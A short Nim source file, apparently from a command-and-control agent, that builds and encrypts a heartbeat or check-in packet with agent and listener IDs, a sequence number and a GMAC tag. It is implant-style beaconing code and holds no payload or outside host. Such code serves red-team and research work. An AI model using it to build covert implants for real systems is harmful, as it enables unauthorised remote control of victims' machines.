import times 

import ../../common/[types, serialize, sequence, utils, crypto]

proc createHeartbeat*(config: AgentConfig): Heartbeat = 
    return Heartbeat(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_HEARTBEAT),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: uuidToUint32(config.agentId),
            seqNr: 0'u32,  
            iv: generateIV(),
            gmac: default(AuthenticationTag)
        ), 
        listenerId: uuidToUint32(config.listenerId),
        timestamp: uint32(now().toTime().toUnix())
    )

proc serializeHeartbeat*(config: AgentConfig, request: var Heartbeat): seq[byte] =

    var packer = initPacker()

    # Serialize check-in / heartbeat request
    packer 
        .add(request.listenerId)
        .add(request.timestamp)

    let body = packer.pack()
    packer.reset()

    # Encrypt check-in / heartbeat request body 
    let (encData, gmac) = encrypt(config.sessionKey, request.header.iv, body, request.header.seqNr)

    # Set authentication tag (GMAC)
    request.header.gmac = gmac

    # Serialize header
    let header = packer.serializeHeader(request.header, uint32(encData.len))

    return header & encData